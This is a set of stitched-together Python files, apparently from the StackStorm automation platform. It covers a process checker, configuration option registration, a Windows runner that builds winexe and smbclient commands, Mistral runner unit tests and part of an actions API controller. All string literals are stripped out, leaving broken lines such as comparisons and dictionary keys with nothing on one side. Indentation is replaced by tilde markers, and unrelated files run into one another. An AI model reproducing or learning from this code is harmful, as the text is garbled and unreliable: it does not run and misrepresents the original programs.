~~ elif foo == : \n 
~~~ self . byName ( criteria ) \n 
~~ elif foo == : \n 
~~~ self . byPid ( criteria ) \n 
\n 
~~ ~~ def show ( self ) : \n 
~~~ prettyOut = { } \n 
if len ( self . interestingProcs ) > 0 : \n 
~~~ for proc in self . interestingProcs : \n 
#  prettyOut += "%s %s - time:%s\\n" % (proc[0],proc[1],proc[13]) \n 
~~~ prettyOut [ proc [ 0 ] ] = proc [ 1 ] \n 
\n 
~~ ~~ if self . pidlist is True : \n 
~~~ pidlist = . join ( prettyOut . keys ( ) ) \n 
sys . stderr . write ( pidlist ) \n 
\n 
~~ print ( json . dumps ( prettyOut ) ) \n 
\n 
\n 
~~ ~~ if __name__ == : \n 
~~~ if "pidlist" in sys . argv : \n 
~~~ pidlist = True \n 
~~ else : \n 
~~~ pidlist = False \n 
\n 
~~ foo = CheckProcs ( ) \n 
foo . setup ( debug = False , pidlist = pidlist ) \n 
foo . run ( sys . argv [ 1 ] , sys . argv [ 2 ] ) \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ from oslo_config import cfg \n 
\n 
import st2common . config as common_config \n 
from st2common . constants . system import VERSION_STRING \n 
common_config . register_opts ( ) \n 
\n 
CONF = cfg . CONF \n 
\n 
\n 
def parse_args ( args = None ) : \n 
~~~ CONF ( args = args , version = VERSION_STRING ) \n 
\n 
\n 
~~ def register_opts ( ) : \n 
~~~ _register_common_opts ( ) \n 
_register_notifier_opts ( ) \n 
\n 
\n 
~~ def get_logging_config_path ( ) : \n 
~~~ return cfg . CONF . notifier . logging \n 
\n 
\n 
~~ def _register_common_opts ( ) : \n 
~~~ common_config . register_opts ( ) \n 
\n 
\n 
~~ def _register_notifier_opts ( ) : \n 
~~~ notifier_opts = [ \n 
cfg . StrOpt ( , default = , \n 
help = ) \n 
] \n 
CONF . register_opts ( notifier_opts , group = ) \n 
\n 
scheduler_opts = [ \n 
cfg . BoolOpt ( , default = True , help = ) , \n 
cfg . IntOpt ( , default = 600 , \n 
help = ) , cfg . IntOpt ( , default = 300 , \n 
help = ) \n 
] \n 
CONF . register_opts ( scheduler_opts , group = ) \n 
\n 
\n 
~~ register_opts ( ) \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
import abc \n 
from distutils . spawn import find_executable \n 
\n 
import six \n 
\n 
from st2actions . runners import ActionRunner \n 
\n 
__all__ = [ \n 
, \n 
\n 
, \n 
\n 
] \n 
\n 
WINEXE_EXISTS = find_executable ( ) is not None \n 
SMBCLIENT_EXISTS = find_executable ( ) is not None \n 
\n 
# Constants which map winexe error codes to user-friendly error messages \n 
ERROR_CODE_TO_MESSAGE_MAP = { \n 
: , \n 
: , \n 
: , \n 
: \n 
} \n 
\n 
\n 
@ six . add_metaclass ( abc . ABCMeta ) \n 
class BaseWindowsRunner ( ActionRunner ) : \n 
~~~ def _verify_winexe_exists ( self ) : \n 
~~~ if not WINEXE_EXISTS : \n 
~~~ msg = ( \'Could not find "winexe" binary. Make sure it\\\'s installed and available\' \n 
) \n 
raise Exception ( msg ) \n 
\n 
~~ ~~ def _verify_smbclient_exists ( self ) : \n 
~~~ if not SMBCLIENT_EXISTS : \n 
~~~ msg = ( \'Could not find "smbclient" binary. Make sure it\\\'s installed and available\' \n 
) \n 
raise Exception ( msg ) \n 
\n 
~~ ~~ def _get_winexe_command_args ( self , host , username , password , command , domain = None ) : \n 
~~~ args = [ ] \n 
\n 
# Disable interactive mode \n 
args += [ , ] \n 
\n 
if domain : \n 
~~~ args += [ , % ( domain , username , password ) ] \n 
~~ else : \n 
~~~ args += [ , % ( username , password ) ] \n 
\n 
~~ args += [ % ( host ) ] \n 
args += [ command ] \n 
\n 
return args \n 
\n 
~~ def _get_smbclient_command_args ( self , host , username , password , command , share = , \n 
domain = None ) : \n 
~~~ """\n        :param command: Samba command string.\n        :type command: ``str``\n\n        :param share: Samba share name.\n        :type share: ``str``\n        """ \n 
args = [ ] \n 
\n 
values = { : domain , : username , : password } \n 
if domain : \n 
~~~ auth_string = % values \n 
~~ else : \n 
~~~ auth_string = % values \n 
\n 
# Authentication info \n 
~~ args += [ , auth_string ] \n 
\n 
# Host and share \n 
args += [ % { : host , : share } ] \n 
\n 
# Command \n 
args += [ , command ] \n 
return args \n 
\n 
~~ def _parse_winexe_error ( self , stdout , stderr ) : \n 
~~~ for code , message in ERROR_CODE_TO_MESSAGE_MAP . items ( ) : \n 
~~~ if code in stdout : \n 
~~~ return message \n 
\n 
~~ ~~ return None \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ ~~ import copy \n 
import uuid \n 
\n 
import mock \n 
import six \n 
import yaml \n 
\n 
from mistralclient . api . v2 import executions \n 
from mistralclient . api . v2 import tasks \n 
from mistralclient . api . v2 import workbooks \n 
from mistralclient . api . v2 import workflows \n 
from oslo_config import cfg \n 
\n 
# XXX: actionsensor import depends on config being setup. \n 
import st2tests . config as tests_config \n 
tests_config . parse_args ( ) \n 
\n 
# Set defaults for retry options. \n 
cfg . CONF . set_override ( , 100 , group = ) \n 
cfg . CONF . set_override ( , 200 , group = ) \n 
cfg . CONF . set_override ( , 200 , group = ) \n 
\n 
import st2common . bootstrap . runnersregistrar as runners_registrar \n 
from st2actions . runners . localrunner import LocalShellRunner \n 
from st2actions . runners . mistral . v2 import MistralRunner \n 
from st2common . constants import action as action_constants \n 
from st2common . models . api . action import ActionAPI \n 
from st2common . models . db . liveaction import LiveActionDB \n 
from st2common . persistence . action import Action \n 
from st2common . persistence . liveaction import LiveAction \n 
from st2common . services import action as action_service \n 
from st2common . transport . liveaction import LiveActionPublisher \n 
from st2common . transport . publishers import CUDPublisher \n 
from st2tests import DbTestCase \n 
from st2tests . fixturesloader import FixturesLoader \n 
from tests . unit . base import MockLiveActionPublisher \n 
\n 
\n 
TEST_FIXTURES = { \n 
: [ \n 
, \n 
\n 
] , \n 
: [ \n 
, \n 
, \n 
\n 
] \n 
} \n 
\n 
PACK = \n 
LOADER = FixturesLoader ( ) \n 
FIXTURES = LOADER . load_fixtures ( fixtures_pack = PACK , fixtures_dict = TEST_FIXTURES ) \n 
\n 
# Workbook with multiple workflows \n 
WB1_YAML_FILE_NAME = TEST_FIXTURES [ ] [ 1 ] \n 
WB1_YAML_FILE_PATH = LOADER . get_fixture_file_path_abs ( PACK , , WB1_YAML_FILE_NAME ) \n 
WB1_SPEC = FIXTURES [ ] [ WB1_YAML_FILE_NAME ] \n 
WB1_YAML = yaml . safe_dump ( WB1_SPEC , default_flow_style = False ) \n 
WB1_NAME = % ( PACK , WB1_YAML_FILE_NAME . replace ( , ) ) \n 
WB1 = workbooks . Workbook ( None , { : WB1_NAME , : WB1_YAML } ) \n 
WB1_MAIN_EXEC = { : str ( uuid . uuid4 ( ) ) , : } \n 
WB1_MAIN_EXEC [ ] = WB1_NAME + \n 
WB1_MAIN_EXEC_ERRORED = copy . deepcopy ( WB1_MAIN_EXEC ) \n 
WB1_MAIN_EXEC_ERRORED [ ] = \n 
WB1_MAIN_TASK1 = { : str ( uuid . uuid4 ( ) ) , : , : } \n 
WB1_MAIN_TASKS = [ tasks . Task ( None , WB1_MAIN_TASK1 ) ] \n 
WB1_MAIN_TASK_ID = WB1_MAIN_TASK1 [ ] \n 
WB1_SUB1_EXEC = { : str ( uuid . uuid4 ( ) ) , : , : WB1_MAIN_TASK_ID } WB1_SUB1_EXEC [ ] = WB1_NAME + \n 
WB1_SUB1_EXEC_ERRORED = copy . deepcopy ( WB1_SUB1_EXEC ) \n 
WB1_SUB1_EXEC_ERRORED [ ] = \n 
WB1_SUB1_TASK1 = { : str ( uuid . uuid4 ( ) ) , : , : } \n 
WB1_SUB1_TASK2 = { : str ( uuid . uuid4 ( ) ) , : , : } \n 
WB1_SUB1_TASKS = [ tasks . Task ( None , WB1_SUB1_TASK1 ) , tasks . Task ( None , WB1_SUB1_TASK2 ) ] \n 
\n 
# Non-workbook with a single workflow \n 
WF1_YAML_FILE_NAME = TEST_FIXTURES [ ] [ 0 ] \n 
WF1_YAML_FILE_PATH = LOADER . get_fixture_file_path_abs ( PACK , , WF1_YAML_FILE_NAME ) \n 
WF1_SPEC = FIXTURES [ ] [ WF1_YAML_FILE_NAME ] \n 
WF1_YAML = yaml . safe_dump ( WF1_SPEC , default_flow_style = False ) \n 
WF1_NAME = % ( PACK , WF1_YAML_FILE_NAME . replace ( , ) ) \n 
WF1 = workflows . Workflow ( None , { : WF1_NAME , : WF1_YAML } ) \n 
WF1_EXEC = { : str ( uuid . uuid4 ( ) ) , : , : WF1_NAME } \n 
WF1_EXEC_NOT_RERUNABLE = copy . deepcopy ( WF1_EXEC ) \n 
WF1_EXEC_NOT_RERUNABLE [ ] = \n 
WF1_TASK1 = { : str ( uuid . uuid4 ( ) ) , : , : } \n 
WF1_TASK2 = { : str ( uuid . uuid4 ( ) ) , : , : } \n 
WF1_TASKS = [ tasks . Task ( None , WF1_TASK1 ) , tasks . Task ( None , WF1_TASK2 ) ] \n 
\n 
# Action executions requirements \n 
ACTION_PARAMS = { : } \n 
\n 
NON_EMPTY_RESULT = \n 
\n 
\n 
@ mock . patch . object ( LocalShellRunner , , mock . \n 
MagicMock ( return_value = ( action_constants . LIVEACTION_STATUS_SUCCEEDED , \n 
NON_EMPTY_RESULT , None ) ) ) \n 
@ mock . patch . object ( CUDPublisher , , mock . MagicMock ( return_value = None ) ) \n 
@ mock . patch . object ( CUDPublisher , , \n 
mock . MagicMock ( side_effect = MockLiveActionPublisher . publish_create ) ) \n 
@ mock . patch . object ( LiveActionPublisher , , \n 
mock . MagicMock ( side_effect = MockLiveActionPublisher . publish_state ) ) \n 
class MistralRunnerTest ( DbTestCase ) : \n 
\n 
~~~ @ classmethod \n 
def setUpClass ( cls ) : \n 
~~~ super ( MistralRunnerTest , cls ) . setUpClass ( ) \n 
runners_registrar . register_runner_types ( ) \n 
\n 
for _ , fixture in six . iteritems ( FIXTURES [ ] ) : \n 
~~~ instance = ActionAPI ( ** fixture ) \n 
Action . add_or_update ( ActionAPI . to_model ( instance ) ) \n 
\n 
~~ ~~ def setUp ( self ) : \n 
~~~ super ( MistralRunnerTest , self ) . setUp ( ) \n 
cfg . CONF . set_override ( , , group = ) \n 
\n 
~~ @ mock . patch . object ( \n 
workflows . WorkflowManager , , \n 
mock . MagicMock ( return_value = [ ] ) ) \n 
@ mock . patch . object ( \n 
workflows . WorkflowManager , , \n 
mock . MagicMock ( return_value = WF1 ) ) \n 
@ mock . patch . object ( \n 
workflows . WorkflowManager , , \n 
mock . MagicMock ( return_value = [ WF1 ] ) ) \n 
@ mock . patch . object ( \n 
executions . ExecutionManager , , \n 
mock . MagicMock ( return_value = executions . Execution ( None , WF1_EXEC ) ) ) \n 
@ mock . patch . object ( \n 
MistralRunner , , \n 
mock . MagicMock ( \n 
return_value = ( action_constants . LIVEACTION_STATUS_RUNNING , \n 
{ : [ ] } , \n 
{ : str ( uuid . uuid4 ( ) ) } ) \n 
) \n 
) \n 
def test_resume_option ( self ) : \n 
~~~ MistralRunner . entry_point = mock . PropertyMock ( return_value = WF1_YAML_FILE_PATH ) \n 
liveaction1 = LiveActionDB ( action = WF1_NAME , parameters = ACTION_PARAMS ) \n 
liveaction1 , execution1 = action_service . request ( liveaction1 ) \n 
self . assertFalse ( MistralRunner . resume . called ) \n 
\n 
# Rerun the execution. \n 
context = { \n 
: { \n 
: execution1 . id , \n 
: [ ] \n 
} \n 
} \n 
\n 
liveaction2 = LiveActionDB ( action = WF1_NAME , parameters = ACTION_PARAMS , context = context ) \n 
liveaction2 , execution2 = action_service . request ( liveaction2 ) \n 
liveaction2 = LiveAction . get_by_id ( str ( liveaction2 . id ) ) \n 
self . assertEqual ( liveaction2 . status , action_constants . LIVEACTION_STATUS_RUNNING ) \n 
\n 
task_specs = { \n 
: { \n 
: False \n 
} \n 
} \n 
\n 
MistralRunner . resume . assert_called_with ( ex_ref = execution1 , task_specs = task_specs ) \n 
\n 
~~ @ mock . patch . object ( \n 
workflows . WorkflowManager , , \n 
mock . MagicMock ( return_value = [ ] ) ) \n 
@ mock . patch . object ( \n 
workflows . WorkflowManager , , \n 
mock . MagicMock ( return_value = WF1 ) ) \n 
@ mock . patch . object ( \n 
workflows . WorkflowManager , , \n 
mock . MagicMock ( return_value = [ WF1 ] ) ) \n 
@ mock . patch . object ( \n 
executions . ExecutionManager , , \n 
mock . MagicMock ( return_value = executions . Execution ( None , WF1_EXEC ) ) ) \n 
@ mock . patch . object ( \n 
MistralRunner , , \n 
mock . MagicMock ( \n 
return_value = ( action_constants . LIVEACTION_STATUS_RUNNING , \n 
{ : [ ] } , \n 
{ : str ( uuid . uuid4 ( ) ) } ) \n 
) \n 
) \n 
def test_resume_option_reset_tasks ( self ) : \n 
~~~ MistralRunner . entry_point = mock . PropertyMock ( return_value = WF1_YAML_FILE_PATH ) \n 
liveaction1 = LiveActionDB ( action = WF1_NAME , parameters = ACTION_PARAMS ) \n 
liveaction1 , execution1 = action_service . request ( liveaction1 ) \n 
self . assertFalse ( MistralRunner . resume . called ) \n 
\n 
# Rerun the execution. \n 
context = { \n 
: { \n 
: execution1 . id , \n 
: [ , ] , \n 
: [ ] \n 
} \n 
} \n 
\n 
liveaction2 = LiveActionDB ( action = WF1_NAME , parameters = ACTION_PARAMS , context = context ) \n 
liveaction2 , execution2 = action_service . request ( liveaction2 ) \n 
liveaction2 = LiveAction . get_by_id ( str ( liveaction2 . id ) ) \n 
self . assertEqual ( liveaction2 . status , action_constants . LIVEACTION_STATUS_RUNNING ) \n 
\n 
task_specs = { \n 
: { \n 
: False \n 
} , \n 
: { \n 
: True \n 
} \n 
} \n 
\n 
MistralRunner . resume . assert_called_with ( ex_ref = execution1 , task_specs = task_specs ) \n 
\n 
~~ @ mock . patch . object ( \n 
workflows . WorkflowManager , , \n 
mock . MagicMock ( return_value = [ ] ) ) \n 
@ mock . patch . object ( \n 
workflows . WorkflowManager , , \n 
mock . MagicMock ( return_value = WF1 ) ) \n 
@ mock . patch . object ( \n 
workflows . WorkflowManager , , \n 
mock . MagicMock ( return_value = [ WF1 ] ) ) \n 
@ mock . patch . object ( \n 
executions . ExecutionManager , , \n 
mock . MagicMock ( return_value = executions . Execution ( None , WF1_EXEC_NOT_RERUNABLE ) ) ) \n 
@ mock . patch . object ( \n 
executions . ExecutionManager , , \n 
mock . MagicMock ( return_value = executions . Execution ( None , WF1_EXEC_NOT_RERUNABLE ) ) ) \n 
@ mock . patch . object ( \n 
tasks . TaskManager , , \n 
mock . MagicMock ( return_value = WF1_TASKS ) ) \n 
def test_resume_workflow_not_in_rerunable_state ( self ) : \n 
~~~ MistralRunner . entry_point = mock . PropertyMock ( return_value = WF1_YAML_FILE_PATH ) \n 
liveaction1 = LiveActionDB ( action = WF1_NAME , parameters = ACTION_PARAMS ) \n 
liveaction1 , execution1 = action_service . request ( liveaction1 ) \n 
\n 
# Rerun the execution. \n 
context = { \n 
: { \n 
: execution1 . id , \n 
: [ ] \n 
} \n 
} \n 
\n 
liveaction2 = LiveActionDB ( action = WF1_NAME , parameters = ACTION_PARAMS , context = context ) \n 
liveaction2 , execution2 = action_service . request ( liveaction2 ) \n 
liveaction2 = LiveAction . get_by_id ( str ( liveaction2 . id ) ) \n 
self . assertEqual ( liveaction2 . status , action_constants . LIVEACTION_STATUS_FAILED ) \n 
self . assertIn ( , liveaction2 . result . get ( ) ) \n 
\n 
~~ @ mock . patch . object ( \n 
workflows . WorkflowManager , , \n 
mock . MagicMock ( return_value = [ ] ) ) \n 
@ mock . patch . object ( \n 
workflows . WorkflowManager , , \n 
mock . MagicMock ( return_value = WF1 ) ) \n 
@ mock . patch . object ( \n 
workflows . WorkflowManager , , \n 
mock . MagicMock ( return_value = [ WF1 ] ) ) \n 
@ mock . patch . object ( \n 
executions . ExecutionManager , , \n 
mock . MagicMock ( return_value = [ executions . Execution ( None , WF1_EXEC ) ] ) ) \n 
@ mock . patch . object ( \n 
executions . ExecutionManager , , \n 
mock . MagicMock ( return_value = executions . Execution ( None , WF1_EXEC ) ) ) \n 
@ mock . patch . object ( \n 
executions . ExecutionManager , , \n 
mock . MagicMock ( return_value = executions . Execution ( None , WF1_EXEC ) ) ) \n 
@ mock . patch . object ( \n 
tasks . TaskManager , , \n 
mock . MagicMock ( return_value = WF1_TASKS ) ) \n 
def test_resume_tasks_not_in_rerunable_state ( self ) : \n 
~~~ MistralRunner . entry_point = mock . PropertyMock ( return_value = WF1_YAML_FILE_PATH ) \n 
liveaction1 = LiveActionDB ( action = WF1_NAME , parameters = ACTION_PARAMS ) \n 
liveaction1 , execution1 = action_service . request ( liveaction1 ) \n 
\n 
# Rerun the execution. \n 
context = { \n 
: { \n 
: execution1 . id , \n 
: [ ] \n 
} \n 
} \n 
\n 
liveaction2 = LiveActionDB ( action = WF1_NAME , parameters = ACTION_PARAMS , context = context ) \n 
liveaction2 , execution2 = action_service . request ( liveaction2 ) \n 
liveaction2 = LiveAction . get_by_id ( str ( liveaction2 . id ) ) \n 
self . assertEqual ( liveaction2 . status , action_constants . LIVEACTION_STATUS_FAILED ) \n 
self . assertIn ( , liveaction2 . result . get ( ) ) \n 
\n 
~~ @ mock . patch . object ( \n 
workflows . WorkflowManager , , \n 
mock . MagicMock ( return_value = [ ] ) ) \n 
@ mock . patch . object ( \n 
workflows . WorkflowManager , , \n 
mock . MagicMock ( return_value = WF1 ) ) \n 
@ mock . patch . object ( \n 
workflows . WorkflowManager , , \n 
mock . MagicMock ( return_value = [ WF1 ] ) ) \n 
@ mock . patch . object ( \n 
executions . ExecutionManager , , \n 
mock . MagicMock ( return_value = [ executions . Execution ( None , WF1_EXEC ) ] ) ) \n 
@ mock . patch . object ( \n 
executions . ExecutionManager , , \n 
mock . MagicMock ( return_value = executions . Execution ( None , WF1_EXEC ) ) ) \n 
@ mock . patch . object ( \n 
executions . ExecutionManager , , \n 
mock . MagicMock ( return_value = executions . Execution ( None , WF1_EXEC ) ) ) \n 
@ mock . patch . object ( \n 
tasks . TaskManager , , \n 
mock . MagicMock ( return_value = WF1_TASKS ) ) \n 
def test_resume_unidentified_tasks ( self ) : \n 
~~~ MistralRunner . entry_point = mock . PropertyMock ( return_value = WF1_YAML_FILE_PATH ) \n 
liveaction1 = LiveActionDB ( action = WF1_NAME , parameters = ACTION_PARAMS ) \n 
liveaction1 , execution1 = action_service . request ( liveaction1 ) \n 
\n 
# Rerun the execution. \n 
context = { \n 
: { \n 
: execution1 . id , \n 
: [ ] \n 
} \n 
} \n 
\n 
liveaction2 = LiveActionDB ( action = WF1_NAME , parameters = ACTION_PARAMS , context = context ) \n 
liveaction2 , execution2 = action_service . request ( liveaction2 ) \n 
liveaction2 = LiveAction . get_by_id ( str ( liveaction2 . id ) ) \n 
self . assertEqual ( liveaction2 . status , action_constants . LIVEACTION_STATUS_FAILED ) \n 
self . assertIn ( , liveaction2 . result . get ( ) ) \n 
\n 
~~ @ mock . patch . object ( \n 
workflows . WorkflowManager , , \n 
mock . MagicMock ( return_value = [ ] ) ) \n 
@ mock . patch . object ( \n 
workflows . WorkflowManager , , \n 
mock . MagicMock ( return_value = WF1 ) ) \n 
@ mock . patch . object ( \n 
workbooks . WorkbookManager , , \n 
mock . MagicMock ( return_value = WB1 ) ) \n 
@ mock . patch . object ( \n 
executions . ExecutionManager , , \n 
mock . MagicMock ( return_value = executions . Execution ( None , WB1_MAIN_EXEC ) ) ) \n 
@ mock . patch . object ( \n 
executions . ExecutionManager , , \n 
mock . MagicMock ( return_value = executions . Execution ( None , WB1_MAIN_EXEC_ERRORED ) ) ) \n 
@ mock . patch . object ( \n 
executions . ExecutionManager , , \n 
mock . MagicMock ( \n 
return_value = [ \n 
executions . Execution ( None , WB1_MAIN_EXEC_ERRORED ) , \n 
executions . Execution ( None , WB1_SUB1_EXEC_ERRORED ) ] ) ) \n 
@ mock . patch . object ( \n 
tasks . TaskManager , , \n 
mock . MagicMock ( side_effect = [ WB1_MAIN_TASKS , WB1_SUB1_TASKS ] ) ) \n 
@ mock . patch . object ( \n 
tasks . TaskManager , , \n 
mock . MagicMock ( return_value = None ) ) \n 
def test_resume_subworkflow_task ( self ) : \n 
~~~ MistralRunner . entry_point = mock . PropertyMock ( return_value = WB1_YAML_FILE_PATH ) \n 
liveaction1 = LiveActionDB ( action = WB1_NAME , parameters = ACTION_PARAMS ) \n 
liveaction1 , execution1 = action_service . request ( liveaction1 ) \n 
\n 
# Rerun the execution. \n 
context = { \n 
: { \n 
: execution1 . id , \n 
: [ ] \n 
} \n 
} \n 
\n 
liveaction2 = LiveActionDB ( action = WB1_NAME , parameters = ACTION_PARAMS , context = context ) \n 
liveaction2 , execution2 = action_service . request ( liveaction2 ) \n 
liveaction2 = LiveAction . get_by_id ( str ( liveaction2 . id ) ) \n 
\n 
self . assertEqual ( liveaction2 . status , action_constants . LIVEACTION_STATUS_RUNNING ) \n 
\n 
expected_env = { \n 
: str ( liveaction2 . id ) , \n 
: str ( execution2 . id ) , \n 
: { \n 
: { \n 
: { \n 
: , \n 
: { } , \n 
: { \n 
: context [ ] , \n 
: str ( execution2 . id ) \n 
} , \n 
: [ ] \n 
} \n 
} \n 
} , \n 
: \n 
} \n 
\n 
tasks . TaskManager . rerun . assert_called_with ( \n 
WB1_SUB1_TASK2 [ ] , \n 
reset = False , \n 
env = expected_env \n 
) \n 
\n 
~~ @ mock . patch . object ( \n 
workflows . WorkflowManager , , \n 
mock . MagicMock ( return_value = [ ] ) ) \n 
@ mock . patch . object ( \n 
workflows . WorkflowManager , , \n 
mock . MagicMock ( return_value = WF1 ) ) \n 
@ mock . patch . object ( \n 
workbooks . WorkbookManager , , \n 
mock . MagicMock ( return_value = WB1 ) ) \n 
@ mock . patch . object ( \n 
executions . ExecutionManager , , \n 
mock . MagicMock ( return_value = executions . Execution ( None , WB1_MAIN_EXEC ) ) ) \n 
@ mock . patch . object ( \n 
executions . ExecutionManager , , \n 
mock . MagicMock ( return_value = executions . Execution ( None , WB1_MAIN_EXEC_ERRORED ) ) ) \n 
@ mock . patch . object ( \n 
executions . ExecutionManager , , \n 
mock . MagicMock ( \n 
return_value = [ \n 
executions . Execution ( None , WB1_MAIN_EXEC_ERRORED ) , \n 
executions . Execution ( None , WB1_SUB1_EXEC_ERRORED ) ] ) ) \n 
@ mock . patch . object ( \n 
tasks . TaskManager , , \n 
mock . MagicMock ( side_effect = [ WB1_MAIN_TASKS , WB1_SUB1_TASKS ] ) ) \n 
def test_resume_unidentified_subworkflow_task ( self ) : \n 
~~~ MistralRunner . entry_point = mock . PropertyMock ( return_value = WB1_YAML_FILE_PATH ) \n 
liveaction1 = LiveActionDB ( action = WB1_NAME , parameters = ACTION_PARAMS ) \n 
liveaction1 , execution1 = action_service . request ( liveaction1 ) \n 
\n 
# Rerun the execution. \n 
context = { \n 
: { \n 
: execution1 . id , \n 
: [ ] \n 
} \n 
} \n 
\n 
liveaction2 = LiveActionDB ( action = WB1_NAME , parameters = ACTION_PARAMS , context = context ) \n 
liveaction2 , execution2 = action_service . request ( liveaction2 ) \n 
liveaction2 = LiveAction . get_by_id ( str ( liveaction2 . id ) ) \n 
self . assertEqual ( liveaction2 . status , action_constants . LIVEACTION_STATUS_FAILED ) \n 
self . assertIn ( , liveaction2 . result . get ( ) ) \n 
\n 
~~ @ mock . patch . object ( \n 
workflows . WorkflowManager , , \n 
mock . MagicMock ( return_value = [ ] ) ) \n 
@ mock . patch . object ( \n 
workflows . WorkflowManager , , \n 
mock . MagicMock ( return_value = WF1 ) ) \n 
@ mock . patch . object ( \n 
workbooks . WorkbookManager , , \n 
mock . MagicMock ( return_value = WB1 ) ) \n 
@ mock . patch . object ( \n 
executions . ExecutionManager , , \n 
mock . MagicMock ( return_value = executions . Execution ( None , WB1_MAIN_EXEC ) ) ) \n 
@ mock . patch . object ( \n 
executions . ExecutionManager , , \n 
mock . MagicMock ( return_value = executions . Execution ( None , WB1_MAIN_EXEC_ERRORED ) ) ) \n 
@ mock . patch . object ( \n 
executions . ExecutionManager , , \n 
mock . MagicMock ( \n 
return_value = [ \n 
executions . Execution ( None , WB1_MAIN_EXEC_ERRORED ) , \n 
executions . Execution ( None , WB1_SUB1_EXEC_ERRORED ) ] ) ) \n 
@ mock . patch . object ( \n 
tasks . TaskManager , , \n 
mock . MagicMock ( side_effect = [ WB1_MAIN_TASKS , WB1_SUB1_TASKS ] ) ) \n 
@ mock . patch . object ( \n 
tasks . TaskManager , , \n 
mock . MagicMock ( return_value = None ) ) \n 
def test_resume_and_reset_subworkflow_task ( self ) : \n 
~~~ MistralRunner . entry_point = mock . PropertyMock ( return_value = WB1_YAML_FILE_PATH ) \n 
liveaction1 = LiveActionDB ( action = WB1_NAME , parameters = ACTION_PARAMS ) \n 
liveaction1 , execution1 = action_service . request ( liveaction1 ) \n 
\n 
# Rerun the execution. \n 
context = { \n 
: { \n 
: execution1 . id , \n 
: [ ] , \n 
: [ ] \n 
} \n 
} \n 
\n 
liveaction2 = LiveActionDB ( action = WB1_NAME , parameters = ACTION_PARAMS , context = context ) \n 
liveaction2 , execution2 = action_service . request ( liveaction2 ) \n 
liveaction2 = LiveAction . get_by_id ( str ( liveaction2 . id ) ) \n 
\n 
self . assertEqual ( liveaction2 . status , action_constants . LIVEACTION_STATUS_RUNNING ) \n 
\n 
expected_env = { \n 
: str ( liveaction2 . id ) , \n 
: str ( execution2 . id ) , \n 
: { \n 
: { \n 
: { \n 
: , \n 
: { } , \n 
: { \n 
: context [ ] , \n 
: str ( execution2 . id ) \n 
} , \n 
: [ ] \n 
} \n 
} \n 
} , \n 
: \n 
} \n 
\n 
tasks . TaskManager . rerun . assert_called_with ( \n 
WB1_SUB1_TASK2 [ ] , \n 
reset = True , \n 
env = expected_env \n 
) \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ ~~ import os \n 
import os . path \n 
\n 
import six \n 
from pecan import abort \n 
from mongoengine import ValidationError \n 
\n 
# TODO: Encapsulate mongoengine errors in our persistence layer. Exceptions \n 
#       that bubble up to this layer should be core Python exceptions or \n 
#       StackStorm defined exceptions. \n 
\n 
from st2api . controllers import resource \n 
from st2api . controllers . v1 . actionviews import ActionViewsController \n 
from st2common import log as logging \n 
from st2common . constants . triggers import ACTION_FILE_WRITTEN_TRIGGER \n 
from st2common . exceptions . action import InvalidActionParameterException \n 
from st2common . exceptions . apivalidation import ValueValidationException \n 
from st2common . models . api . base import jsexpose \n 
from st2common . persistence . action import Action \n 
from st2common . models . api . action import ActionAPI \n 
from st2common . models . api . action import ActionCreateAPI \n 
from st2common . persistence . pack import Pack \n 
from st2common . validators . api . misc import validate_not_part_of_system_pack \n 
from st2common . content . utils import get_pack_base_path \n 
from st2common . content . utils import get_pack_resource_file_abs_path \n 
from st2common . content . utils import get_relative_path_to_pack \n 
from st2common . transport . reactor import TriggerDispatcher \n 
from st2common . util . system_info import get_host_info \n 
import st2common . validators . api . action as action_validator \n 
from st2common . rbac . types import PermissionType \n 
from st2common . rbac . decorators import request_user_has_permission \n 
from st2common . rbac . decorators import request_user_has_resource_api_permission \n 
from st2common . rbac . decorators import request_user_has_resource_db_permission \n 
\n 
http_client = six . moves . http_client \n 
\n 
LOG = logging . getLogger ( __name__ ) \n 
\n 
\n 
class ActionsController ( resource . ContentPackResourceController ) : \n 
~~~ """\n        Implements the RESTful web endpoint that handles\n        the lifecycle of Actions in the system.\n    """ \n 
views = ActionViewsController ( ) \n 
\n 
model = ActionAPI \n 
access = Action \n 
supported_filters = { \n 
: , \n 
: \n 
} \n 
\n 
query_options = { \n 
: [ , ] \n 
} \n 
\n 
include_reference = True \n 
\n 
